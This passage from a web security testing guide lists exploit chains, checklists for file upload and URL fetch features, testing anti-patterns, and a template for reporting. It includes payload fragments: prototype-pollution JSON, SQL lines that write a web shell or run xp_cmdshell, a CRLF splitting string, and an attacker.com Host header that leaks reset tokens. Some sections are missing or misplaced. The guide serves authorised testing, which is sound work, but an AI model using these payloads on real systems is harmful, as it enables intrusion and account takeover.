CL.TE smuggles a prefix that sets a header on the *next* request
→ victim's request gets the poisoned response from cache
→ script executes on the trusted origin

Use the single-packet attack for reliability.

3.12 Desync → auth bypass

Smuggle a request to /admin behind the proxy's ACL, or smuggle a second request that inherits your authenticated connection.

3.13 Cache deception → token theft

victim visits /account/..%2faccount (or /account/logo.png)
→ cache stores their authenticated page under that key
→ attacker fetches it → session token / PII

(ChatGPT ATO)

3.14 Content-type confusion → stored XSS → ATO

upload HTML to object storage, override Content-Type to text/html
→ executes on the bucket origin (often a trusted sibling domain)
→ read cookies / call the API with credentials

(Content-Type Override)

3.15 CSPT → CSRF → state change

URL segment controls a path the front end concatenates into an API call
→ ../../other-endpoint reroutes the authenticated request
→ POST with the victim's cookies despite SameSite

(CSPT2CSRF)

3.16 Open redirect → OAuth code theft

redirect_uri validated by prefix, then an open redirect on the registered host forwards the ?code= to you. Chain with prompt=none for silence.

3.17 Prototype pollution → gadget → RCE

{"__proto__":{"shell":"/proc/self/exe","NODE_OPTIONS":"--require /tmp/x.js"}}
→ child_process spawn picks up the polluted option

(Silent Spring, GHunter)

3.18 SQLi → file write → RCE

INTO OUTFILE '/var/www/html/s.php'   (MySQL, secure_file_priv='')
lo_export / COPY ... TO PROGRAM      (Postgres)
BACKUP ... TO DISK + xp_cmdshell     (MSSQL)

3.19 SQLi → credential → lateral

Dump the users table → crack or pass-the-hash → reuse on the admin panel, VPN, or CI.

3.20 Subdomain takeover → cookie toss → session fixation

dangling CNAME → claim the host → set Domain=parent cookie with Path=/oauth
→ victim's OAuth callback uses your session → then you log in

(Cookie tossing)

3.21 Host header → reset poisoning

POST /forgot-password  Host: attacker.com  (or X-Forwarded-Host)
→ mail contains https://attacker.com/reset?token=...
→ victim clicks → token leaks

3.22 CRLF → response splitting → cache poison

/u%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK...

Nest a second splitting payload inside the injected script src to satisfy script-src 'self'. (CRLF nested CSP gadget)

3.23 Debug endpoint → env → RCE

/actuator/env, /debug, /__debug__, /server-status, /.git/config, /graphql introspection, /swagger-ui. Env vars → cloud creds or a writable config path.

3.24 Race → double spend / duplicate identity

Single-packet N requests to the redeem endpoint; compare with a serial control.

3.25 DoS → header loss → XSS

Overflow max_input_vars so headers are never sent, then inject into a page that now has no CSP and no nosniff.

4. Feature checklists

4.1 Upload

  • Extension allowlist vs sniffer vs server handler; .php5, .phtml, .pht, .phar, .jspx, .ashx, .svg, .html
  • Double extension, trailing dot/space, %00, case, ::$DATA (Windows)
  • Content-Type supplied by the client and trusted
  • Filename → path join; traversal; absolute path
  • Image reprocessing (survives?), EXIF retained?, metadata stripped?
  • Where is it stored — webroot, CDN, object storage, temp?
  • Is the stored name predictable? Is the directory listable?
  • Archive extraction: zip slip, symlink, nested archive, decompression bomb
  • SVG: scripts, xlink:href, external entities, use/import
  • Office/PDF: macros, external refs, OLE, XFA, embedded files

4.2 URL fetch / import

  • Scheme allowlist; file://, gopher://, dict://, ftp://, phar://
  • Redirect following and re-validation
  • DNS resolution timing (rebind)
  • Response size cap, timeout, content-type validation
  • Is the body returned, rendered, or parsed?
  • Does it store the fetched bytes (→ stored XSS)?
  • Auth headers forwarded to the new host?

4.3 PDF / image / document generation

  • HTML injection into the renderer → SSRF, file read, local file inclusion in the PDF

4.4 Webhook / callback

4.6 SSO / OAuth

  • Actuator/debug endpoints
  • File manager, template editor, SQL console, cron editor

6. Anti-patterns

  • Reporting the primitive as the impact. "SSRF to 169.254.169.254" is not a finding; "role X can read bucket Y" is.
  • Skipping the control request. Half of "findings" are the app's normal behaviour.
  • Timing without statistics. One 300 ms sample proves nothing.
  • Ignoring the second parser. The bug is the disagreement, not the payload.
  • Testing only the happy path. Every 4xx branch has its own parser.
  • Assuming nosniff ends MIME games. It does not, with comma lists.
  • Forgetting cleanup. Cache entries, uploaded shells, created users, poisoned DNS.
  • Over-escalating. Root on prod when a read-only proof suffices, without asking.
  • Trusting the WAF's block page. A 403 can be the vulnerable path (see Response Filter DoS).

7. Reporting a chain

Structure:

  1. Summary — one sentence, the final impact, not the first bug.
  2. Preconditions — account level, config, network position.
  3. Steps — numbered, each with the exact request and the observed response.
  4. Why each link holds — the parser pair, the transform, the missing check.
  5. Impact — data, scope, persistence, blast radius.
  6. Fix — per link, not just the last one. Fixing the sink leaves the chain intact.
  7. Evidence — raw requests, timestamps, a short screen recording for multi-step.

Rate by the end of the chain. A chain of three mediums is usually a high.

10. Closing

The uncommon tricks are uncommon because they sit at boundaries nobody owns: between the proxy and the app, between the validator and the parser, between the write and the loader. Learn the boundaries, and the payloads become obvious.

Three habits that matter more than any list:

  1. Read the patch. Every diff is a map of where the developers thought the boundary was.
  2. Build the control. Prove the difference before you claim it.
  3. Follow the ladder. Never stop at the primitive.
